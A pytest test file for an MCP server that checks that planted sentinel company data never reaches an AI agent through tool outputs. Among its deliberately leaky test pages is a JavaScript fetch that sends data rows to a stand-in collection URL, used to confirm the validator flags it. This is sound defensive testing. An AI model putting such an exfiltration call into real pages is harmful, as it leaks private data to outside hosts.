"""No company data reaches the agent: a sentinel planted in the warehouse appears in no MCP
tool output, whatever the agent asks and whatever its pages do."""

import asyncio
import json
import shutil

import duckdb
import pytest
from mcp import Client

pytestmark = pytest.mark.browser

REGION, COUNTRY, REVENUE = "Sentinelia", "Sentinelland", "31415.92"
SENTINELS = (REGION, COUNTRY, REVENUE, "31,415.92", "31415", "31,415")


@pytest.fixture
def warehouse(tmp_path, demo_project):
    """A copy of the demo warehouse with one customer in a made-up region, and one order of
    exactly 31,415.92 in the default window."""
    path = tmp_path / "demo.duckdb"  # same name: the manifest's relations name it
    shutil.copy(demo_project.db_path, path)
    with duckdb.connect(str(path)) as conn:
        conn.execute(
            f"INSERT INTO main.customers VALUES (999001, '2024-01-01', '{COUNTRY}', '{REGION}', "
            "'Consumer')"
        )
        conn.execute("INSERT INTO main.orders VALUES (999001, '2026-09-01', 999001, 'web')")
        conn.execute(
            "INSERT INTO main.order_items VALUES (999001, 999001, '2026-09-01', 999001, 1, 1, "
            f"{REVENUE}, 0, {REVENUE}, 0, {REVENUE}, 1)"
        )
    return path


@pytest.fixture
def services(tmp_path, demo_project, warehouse):
    from prumi.config import load_config
    from prumi.services import Services

    config = tmp_path / "prumi.toml"
    config.write_text(
        f"""
[server]
data_dir = "data"
as_of = "2026-10-15"

[source]
adapter = "dbt"

[source.dbt]
semantic_manifest = "{demo_project.manifest_path.as_posix()}"

[source.dbt.connection]
type = "duckdb"
path = "{warehouse.as_posix()}"
"""
    )
    return Services(load_config(config))


SPEC = {
    "spec_version": 0,
    "dashboard": {"id": "regions", "title": "Revenue by region"},
    "filters": [{"id": "region", "type": "dimension", "dimension": "customer__region",
                 "default": []}],
    "data": [
        {"id": "regions", "metrics": ["revenue"], "dimensions": ["customer__region"],
         "window": {"last": 12, "grain": "week"}, "filters": [], "total": True,
         "compare": "previous_period", "sort": {"by": "revenue", "descending": True}},
        {"id": "kpi", "metrics": ["revenue"], "window": {"last": 12, "grain": "week"},
         "filters": ["region"]},
    ],
    "presentation": {"bindings": {"#regions": "regions", "#kpi": "kpi"}},
}  # fmt: skip


def page(script: str = "") -> str:
    """A page that shows every region with its revenue, plus `script` for the region rows."""
    return f"""<!doctype html><html><body>
<ul id="regions"></ul><p id="kpi"></p>
<script>
  prumi.on("regions", (b) => {{
    document.getElementById("regions").innerHTML = b.rows.map((row) =>
      `<li>${{row.customer__region || "No region"}}: ${{prumi.format(row.revenue, "revenue")}}</li>`
    ).join("");
    {script}
  }});
  prumi.on("kpi", (b) => {{
    document.getElementById("kpi").textContent = prumi.format(b.rows[0].revenue, "revenue");
  }});
</script></body></html>"""


def test_no_sentinel_reaches_the_agent(services, warehouse):
    from prumi.mcp import create_mcp
    from prumi.registry import PageCheck

    services.checker.start()
    outputs = []

    async def session():
        async with Client(create_mcp(services)) as mcp:

            async def call(tool, **arguments):
                result = await mcp.call_tool(tool, arguments)
                outputs.append((tool, result.structured_content, [c.text for c in result.content]))
                return result

            await call("find_metrics", question="revenue by region")
            await call("describe_metric", name="revenue")
            window = {"last": 12, "grain": "week"}
            for extra in (
                {},
                {"time_grain": "week"},
                {"total": True, "compare": "previous_period"},
            ):
                await call(
                    "query", metrics=["revenue"], dimensions=["customer__region"],
                    window=window, **extra,
                )  # fmt: skip
            await call("query", metrics=["revenue"], dimensions=["nope"], window=window)

            # Pages that pass, and pages that leak data every way a page can.
            clean = await call("validate_spec", spec=SPEC, html=page())
            assert clean.structured_content["ok"], clean.structured_content
            for script in (
                # a number computed from the data, outside and inside bound elements
                'document.body.insertAdjacentHTML("beforeend", "<p>" + b.rows.map('
                '(r) => r.revenue * 2).join(", ") + "</p>");',
                'document.getElementById("regions").insertAdjacentHTML("beforeend", "<li>" + '
                'prumi.format(b.rows[0].revenue * 3, "revenue") + "</li>");',
                # an error whose message holds data
                "throw new Error(b.rows.map((r) => r.customer__region + ' ' + r.revenue).join());",
                # a call out with data in the URL
                'fetch("https://example.com/collect?d=" + encodeURIComponent('
                "JSON.stringify(b.rows))).catch(() => {});",
            ):
                report = await call("validate_spec", spec=SPEC, html=page(script))
                assert report.structured_content["errors"] or report.structured_content["warnings"]
            await call(
                "validate_spec",
                spec=SPEC,
                html=page(),
                check_states=[{"filters": {"region": ["Europe"]}}],
                layout_devices=["phone"],
            )
            published = await call(
                "publish_dashboard", candidate_id=clean.structured_content["candidate_id"]
            )
            assert not published.is_error

            # A viewer's browser saw data on the page; the report reaches the agent scrubbed.
            flagged = [{"text": f"${REVENUE}", "path": "li", "code": "R8.unverified_number"}]
            check = PageCheck({"region": [REGION]}, flagged, False, [f"{REGION} broke"])
            services.registry.record_check("regions", 1, check)
            await call("list_dashboards")
            await call("get_dashboard", id="regions", include_html=False)
            await call("get_dashboard", id="nope")

    asyncio.run(session())
    # The sentinel is in the data the pages showed.
    with duckdb.connect(str(warehouse), read_only=True) as conn:
        found = conn.execute("SELECT count(*) FROM main.customers WHERE region = ?", [REGION])
        assert found.fetchone() == (1,)
    for tool, structured, texts in outputs:
        dumped = json.dumps(structured, ensure_ascii=False) + "\n".join(texts)
        for sentinel in SENTINELS:
            assert sentinel not in dumped, (tool, sentinel, dumped[:2000])
